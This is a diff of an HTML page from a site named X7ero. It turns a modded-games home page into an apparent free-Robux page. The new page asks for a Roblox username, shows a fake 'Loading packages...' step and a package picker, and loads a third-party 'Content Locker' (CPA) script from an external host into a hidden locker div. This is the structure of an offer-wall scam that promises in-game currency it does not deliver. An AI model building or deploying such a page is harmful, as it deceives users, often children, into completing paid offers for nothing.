@@ -1,151 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>X7ero | Home</title>
-  <link rel="stylesheet" href="style/index.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X7ero | Roblox</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="../style/index.css" />
+  <link rel="stylesheet" href="../style/robux.css" />
+
+  <!-- Favicon -->
+  <link rel="apple-touch-icon" sizes="180x180" href="./images/Logo.webp">
+  <link rel="icon" type="image/png" sizes="32x32" href="./images/Logo.webp">
+  <link rel="icon" type="image/png" sizes="16x16" href="./images/Logo.webp">
+
+  <!-- FontAwesome -->
   <script src="https://kit.fontawesome.com/a2e0e6d58f.js" crossorigin="anonymous"></script>
+
+  <!-- Content Locker Script -->
+  <script type="text/javascript">
+    var cqXeH_LNZ_YNqPvc = {"it":4530265,"key":"55fbb"};
+  </script>
+  <script src="https://d1y0yks1k8t5m5.cloudfront.net/e613c2a.js"></script>
+
 </head>
+
 <body>
-  <!-- Header -->
-  <header class="navbar">
-    <div class="logo">
-      <span>X7ero</span>
-    </div>
-
+  <!-- Navbar -->
+  <!-- <header class="navbar">
+    <div class="logo"><span>X7ero</span></div>
+    <i class="fa-solid fa-bars menu-toggle"></i>
     <nav class="menu">
-      <a href="views/games.html">Games</a>
-
-      <!-- Roblox Dropdown -->
+      <a href="../index.html">Home</a>
+      <a href="../views/games.html">Games</a>
       <div class="dropdown">
-        <button class="dropbtn">Roblox <i class="fa-solid fa-angle-down"></i></button>
+        <a href="javascript:void(0)">Roblox <i class="fa-solid fa-caret-down"></i></a>
         <div class="dropdown-content">
-          <a href="views/garden.html">Garden</a>
-          <a href="views/robux.html">Robux</a>
-          <!-- <a href="views/diamantes.html">Diamantes</a> -->
+          <a href="garden.html">Garden</a>
+          <a href="robux.html">Robux</a>
+          <a href="diamonds.html">Diamonds</a>
         </div>
       </div>
-
-      <a href="views/blog.html">Blog</a>
-      <!-- <a href="views/login.html">Login</a> -->
+      <a href="../views/blog.html">Blog</a>
+      <a href="../views/login.html">Login</a>
     </nav>
+    <div class="theme-toggle"><i class="fa-regular fa-sun"></i></div>
+  </header> -->
 
-    <div class="theme-toggle">
-      <i class="fa-regular fa-sun"></i>
+  <!-- Banner -->
+  <div class="banner">
+    <img src="../images/roblox.webp" alt="Roblox Banner">
+    <div class="banner-overlay">
+      <p>Roblox allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
     </div>
-  </header>
+  </div>
 
-  <!-- 🎞️ Slider Section -->
-  <section class="slide-section">
-    <div class="slide-container" id="slide-container"></div>
-  </section>
+  <!-- Username Form -->
+  <form id="usernameForm" class="form-container">
+    <h2 class="form-title">Roblox Username</h2>
+    <input type="text" id="usernameInput" placeholder="Enter username" class="form-input" required>
+    <button type="submit" class="submit-btn">Continue</button>
+  </form>
 
-  <!-- 🎮 Updated Games -->
-  <section class="updated-games">
-    <div class="games-header">
-      <h2><i class="fa-solid fa-gamepad"></i> Updated Games</h2>
-      <button class="view-all" onclick="location.href='views/games.html'">
-        View All <i class="fa-solid fa-angle-right"></i>
-      </button>
-    </div>
-    <div class="games-grid" id="games-container"></div>
-  </section>
+  <!-- Loading -->
+  <div id="loading" class="loading-container" style="display:none; text-align:center;">
+    <img src="../images/money_icon.png" alt="Loading" width="50">
+    <p id="loadingText">Loading packages...</p>
+  </div>
 
-  <!-- 📱 Updated Apps -->
-  <section class="updated-games">
-    <div class="games-header">
-      <h2><i class="fa-solid fa-mobile-screen"></i> Updated Apps</h2>
-      <button class="view-all" onclick="location.href='views/apps.html'">
-        View All <i class="fa-solid fa-angle-right"></i>
-      </button>
-    </div>
-    <div class="games-grid" id="apps-container"></div>
-  </section>
+  <!-- Packages -->
+  <div id="packages" class="packages-container" style="display:none;">
+    <h2 class="packages-title">Select Roblox Package</h2>
+    <div id="packageList" class="packages-grid"></div>
+  </div>
 
-  <!-- Script -->
-  <script>
-    // Roblox dropdown toggle for mobile
-    const dropbtn = document.querySelector(".dropbtn");
-    dropbtn.addEventListener("click", () => {
-      document.querySelector(".dropdown").classList.toggle("active");
-    });
+  <!-- CPA Locker -->
+  <div id="cpa-locker" style="display:none"></div>
 
-    async function loadContent() {
-      try {
-        // Load slides
-        const slideRes = await fetch("data/slide.json");
-        const slides = await slideRes.json();
-        const slideContainer = document.getElementById("slide-container");
-        slideContainer.innerHTML = "";
-        slides.forEach(item => {
-          const card = document.createElement("div");
-          card.classList.add("slide-card");
-          card.innerHTML = `
-            <img src="${item.image}" alt="${item.title}">
-            <h2>${item.title}</h2>
-            <p>${item.description}</p>
-          `;
-          slideContainer.appendChild(card);
-        });
-
-        // Load games and apps
-        const response = await fetch("data/games.json");
-        const data = await response.json();
-
-        const gamesContainer = document.getElementById("games-container");
-        const appsContainer = document.getElementById("apps-container");
-
-        gamesContainer.innerHTML = "";
-        appsContainer.innerHTML = "";
-
-        // 🎮 Games
-        const games = data.filter(item => item.type === "game").slice(0, 6);
-        games.forEach(item => {
-          const card = document.createElement("div");
-          card.classList.add("game-card");
-          card.innerHTML = `
-            <div class="game-image">
-              <img src="${item.image}" alt="${item.title}">
-              <span class="tag">MOD</span>
-            </div>
-            <div class="game-info">
-              <h3>${item.title}</h3>
-              <p class="small-text">Size: ${item.size}</p>
-              <p class="small-text">Version: ${item.version} <span class="mod-text">MOD</span></p>
-              <small>📅 ${item.date}</small>
-            </div>
-            <span class="status updated">UPDATED</span>
-          `;
-          gamesContainer.appendChild(card);
-        });
-
-        // 📱 Apps
-        const apps = data.filter(item => item.type === "app").slice(0, 6);
-        apps.forEach(item => {
-          const card = document.createElement("div");
-          card.classList.add("game-card");
-          card.innerHTML = `
-            <div class="game-image">
-              <img src="${item.image}" alt="${item.title}">
-              <span class="tag">MOD</span>
-            </div>
-            <div class="game-info">
-              <h3>${item.title}</h3>
-              <p class="small-text">Size: ${item.size}</p>
-              <p class="small-text">Version: ${item.version} <span class="mod-text">MOD</span></p>
-              <small>📅 ${item.date}</small>
-            </div>
-            <span class="status updated">UPDATED</span>
-          `;
-          appsContainer.appendChild(card);
-        });
-      } catch (error) {
-        console.error("Error loading data:", error);
-      }
-    }
-
-    loadContent();
-  </script>
+  <!-- Scripts -->
+  <script src="../script/robux.js"></script>
 </body>
 </html>
